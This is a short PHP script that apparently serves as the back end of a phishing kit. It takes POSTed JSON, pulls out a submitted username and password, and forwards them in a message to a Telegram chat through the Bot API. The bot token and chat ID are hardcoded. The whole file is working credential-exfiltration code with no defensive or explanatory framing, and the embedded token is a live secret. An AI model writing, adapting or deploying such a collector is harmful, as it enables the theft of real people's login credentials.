<?php
// Retrieve POST data
$data = json_decode(file_get_contents('php://input'), true);

// Telegram Bot API information
$botToken = "8072126310:AAH0AMRalC_j8I7AyWU_KytZ0a1lRwBAiVA";
$chatId = "8072126310";

// Prepare message
$message = "Event: " . $data['event'] . "\n";
if (isset($data['details'])) {
    $message .= "Username: " . $data['details']['username'] . "\n";
    $message .= "Password: " . $data['details']['password'] . "\n";
}

// Send message to Telegram
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
file_get_contents($telegramUrl);

// Return a response
echo json_encode(["status" => "success"]);